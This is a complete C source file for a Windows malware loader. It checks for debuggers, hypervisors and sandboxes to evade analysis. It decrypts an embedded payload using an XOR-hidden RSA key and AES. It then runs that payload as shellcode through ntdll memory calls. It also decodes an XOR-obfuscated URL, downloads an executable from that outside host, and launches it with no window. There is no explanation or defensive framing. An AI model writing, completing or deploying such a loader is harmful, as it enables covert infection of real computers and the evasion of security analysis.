#include <Windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <intrin.h>
#include <wininet.h>
#include "payload.h"

// Define missing NTSTATUS codes
#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// Disable intrinsics for this file
#pragma function(memset, memcpy)

// Safe implementations to override intrinsics
void* __cdecl memset(void* dest, int c, size_t count) {
    BYTE* d = (BYTE*)dest;
    while (count--) *d++ = (BYTE)c;
    return dest;
}

void* __cdecl memcpy(void* dest, const void* src, size_t count) {
    BYTE* d = (BYTE*)dest;
    const BYTE* s = (const BYTE*)src;
    while (count--) *d++ = *s++;
    return dest;
}

// Obfuscated download URL (XOR-encrypted)
const BYTE obfuscatedUrl[] = { 0xA4, 0xB8, 0xB8, 0xBC, 0xBF, 0xF6, 0xE3, 0xE3, 0xAB, 0xA5, 0xB8, 0xA4, 0xB9, 0xAE, 0xE2, 0xAF, 0xA3, 0xA1, 0xE3, 0x88, 0xBE, 0xAD, 0xA7, 0xA3, 0xBA, 0xB8, 0xA4, 0xA9, 0xFA, 0xB8, 0xA4, 0xE3, 0x98, 0x8E, 0xB9, 0x8B, 0xE3, 0xBE, 0xAD, 0xBB, 0xE3, 0xA1, 0xAD, 0xBF, 0xB8, 0xA9, 0xBE, 0xE3, 0xE1, 0x8D, 0xA8, 0xBA, 0xAD, 0xA2, 0xAF, 0xA9, 0xE2, 0xA9, 0xB4, 0xA9 };
const DWORD urlSize = sizeof(obfuscatedUrl);

// Anti-analysis techniques
BOOL AntiAnalysis() {
    // 1. Debugger detection
    if (IsDebuggerPresent()) {
        return FALSE;
    }
    
    BOOL isRemoteDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent)) {
        if (isRemoteDebuggerPresent) {
            return FALSE;
        }
    }
    
    // 2. Hypervisor detection
    int cpuInfo[4];
    for (int i = 0; i < 4; i++) cpuInfo[i] = 0;  // Manual init
    
    __cpuid(cpuInfo, 1);
    if (cpuInfo[2] & (1 << 31)) {
        return FALSE;
    }
    
    // 3. Sandbox detection - Memory check
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) {
        return FALSE;
    }
    
    // 4. Sandbox detection - Uptime check
    if (GetTickCount64() < (2 * 60 * 1000)) {
        return FALSE;
    }
    
    // 5. CPU core check
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        return FALSE;
    }
    
    return TRUE;
}

// RSA decryption function
BOOL DecryptPayload(BYTE** output, DWORD* outputSize) {
    BCRYPT_ALG_HANDLE hRsaAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    BOOL success = FALSE;
    BYTE* private_key = NULL;
    
    // Open RSA algorithm provider
    if (BCryptOpenAlgorithmProvider(&hRsaAlg, BCRYPT_RSA_ALGORITHM, NULL, 0) != STATUS_SUCCESS) {
        goto cleanup;
    }
    
    // Allocate memory for deobfuscated private key
    private_key = (BYTE*)LocalAlloc(LPTR, private_key_obf_size);
    if (!private_key) goto cleanup;
    
    // Deobfuscate private key with XOR (key = 0xAA)
    for (DWORD i = 0; i < private_key_obf_size; i++) {
        private_key[i] = private_key_obf[i] ^ 0xAA;
    }
    
    // Import RSA private key
    if (BCryptImportKeyPair(
        hRsaAlg,
        NULL,
        BCRYPT_RSAPRIVATE_BLOB,
        &hKey,
        private_key,
        private_key_obf_size,
        0) != STATUS_SUCCESS) goto cleanup;
    
    // Extract encrypted AES key (first 512 bytes of payload)
    DWORD aesKeySize = 512;
    const BYTE* encryptedAesKey = payload;

    // Decrypt AES key - manual initialization
    BYTE aesKey[32];
    for (int i = 0; i < 32; i++) aesKey[i] = 0;
    
    DWORD decryptedSize = sizeof(aesKey);
    
    if (BCryptDecrypt(
        hKey,
        (PUCHAR)encryptedAesKey,
        aesKeySize,
        NULL,
        NULL,
        0,
        aesKey,
        sizeof(aesKey),
        &decryptedSize,
        BCRYPT_PAD_OAEP) != STATUS_SUCCESS) goto cleanup;
    
    // Validate AES key size
    if (decryptedSize != 32) goto cleanup;
    
    // Extract IV (next 16 bytes after encrypted AES key)
    const BYTE* iv = payload + aesKeySize;
    const BYTE* ciphertext = iv + 16;
    DWORD cipherSize = payload_size - aesKeySize - 16;
    
    // Setup AES decryption
    BCRYPT_ALG_HANDLE hAesAlg = NULL;
    BCRYPT_KEY_HANDLE hAesKey = NULL;
    
    if (BCryptOpenAlgorithmProvider(&hAesAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS) 
        goto cleanup;
    
    // Set CBC mode
    if (BCryptSetProperty(
        hAesAlg, 
        BCRYPT_CHAINING_MODE, 
        (BYTE*)BCRYPT_CHAIN_MODE_CBC, 
        sizeof(BCRYPT_CHAIN_MODE_CBC), 
        0) != STATUS_SUCCESS) goto cleanup;
    
    // Generate symmetric key
    if (BCryptGenerateSymmetricKey(
        hAesAlg, 
        &hAesKey, 
        NULL, 
        0, 
        aesKey, 
        sizeof(aesKey), 
        0) != STATUS_SUCCESS) goto cleanup;
    
    // Allocate output buffer
    *output = (BYTE*)LocalAlloc(LPTR, cipherSize);
    if (!*output) goto cleanup;
    
    *outputSize = cipherSize;
    
    // Create a non-const copy of IV
    BYTE iv_copy[16];
    CopyMemory(iv_copy, iv, 16);
    
    // Perform AES decryption
    if (BCryptDecrypt(
        hAesKey,
        (PUCHAR)ciphertext,
        cipherSize,
        NULL,
        iv_copy,
        16,
        *output,
        cipherSize,
        outputSize,
        BCRYPT_BLOCK_PADDING) != STATUS_SUCCESS) goto cleanup;
    
    success = TRUE;

cleanup:
    // Cleanup sensitive data
    SecureZeroMemory(aesKey, sizeof(aesKey));
    
    if (private_key) {
        SecureZeroMemory(private_key, private_key_obf_size);
        LocalFree(private_key);
    }
    if (hKey) BCryptDestroyKey(hKey);
    if (hAesKey) BCryptDestroyKey(hAesKey);
    if (hAesAlg) BCryptCloseAlgorithmProvider(hAesAlg, 0);
    if (hRsaAlg) BCryptCloseAlgorithmProvider(hRsaAlg, 0);
    
    return success;
}

// Secure shellcode execution using direct syscalls
void ExecuteShellcode(BYTE* shellcode, SIZE_T size) {
    // Define function pointer types
    typedef NTSTATUS (NTAPI* NtAllocateVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );
    
    typedef NTSTATUS (NTAPI* NtProtectVirtualMemory_t)(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    );
    
    // Resolve syscall functions
    NtAllocateVirtualMemory_t _NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
    
    NtProtectVirtualMemory_t _NtProtectVirtualMemory = (NtProtectVirtualMemory_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    
    if (!_NtAllocateVirtualMemory || !_NtProtectVirtualMemory) 
        return;
    
    // Allocate RW memory
    LPVOID execMem = NULL;
    SIZE_T allocSize = size;
    NTSTATUS status = _NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (status != STATUS_SUCCESS) return;
    
    // Copy shellcode
    CopyMemory(execMem, shellcode, size);
    
    // Change protection to RX
    ULONG oldProtect;
    status = _NtProtectVirtualMemory(
        GetCurrentProcess(),
        &execMem,
        &allocSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );
    
    if (status != STATUS_SUCCESS) {
        VirtualFree(execMem, 0, MEM_RELEASE);
        return;
    }
    
    // Execute shellcode
    ((void(*)())execMem)();
    
    // Cleanup memory
    SecureZeroMemory(execMem, size);
    VirtualFree(execMem, 0, MEM_RELEASE);
}

// Download and execute an EXE file
void DownloadAndExecute() {
    // Deobfuscate URL - manual initialization
    char url[256];
    for (int i = 0; i < 256; i++) url[i] = 0;
    
    for (DWORD i = 0; i < urlSize; i++) {
        url[i] = obfuscatedUrl[i] ^ 0xCC;
    }
    
    // Get temporary file path
    char tempPath[MAX_PATH];
    char tempFile[MAX_PATH];
    
    if (!GetTempPathA(MAX_PATH, tempPath)) {
        return;
    }
    
    if (!GetTempFileNameA(tempPath, "dl", 0, tempFile)) {
        return;
    }
    
    // Append .exe extension using WinAPI
    char exePath[MAX_PATH];
    lstrcpyA(exePath, tempFile);
    lstrcatA(exePath, ".exe");
    
    // Download file
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return;
    }
    
    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return;
    }
    
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
        if (bytesRead == 0) break;
        
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }
    
    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    // Execute downloaded file - manual struct initialization
    STARTUPINFOA si;
    SecureZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    PROCESS_INFORMATION pi;
    SecureZeroMemory(&pi, sizeof(pi));
    
    if (CreateProcessA(exePath, NULL, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Schedule file for deletion
    MoveFileExA(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}

// Main entry point
int main() {
    // Anti-analysis checks
    if (!AntiAnalysis()) {
        DownloadAndExecute();
        return 1;
    }
    
    // Check for admin privileges
    if (!IsUserAnAdmin()) {
        DownloadAndExecute();
        return 1;
    }
    
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    
    // Attempt shellcode injection
    if (DecryptPayload(&shellcode, &shellcodeSize)) {
        ExecuteShellcode(shellcode, shellcodeSize);
    }
    
    // Always download and execute
    DownloadAndExecute();
    
    // Cleanup
    if (shellcode) {
        SecureZeroMemory(shellcode, shellcodeSize);
        LocalFree(shellcode);
    }
    
    return 0;
}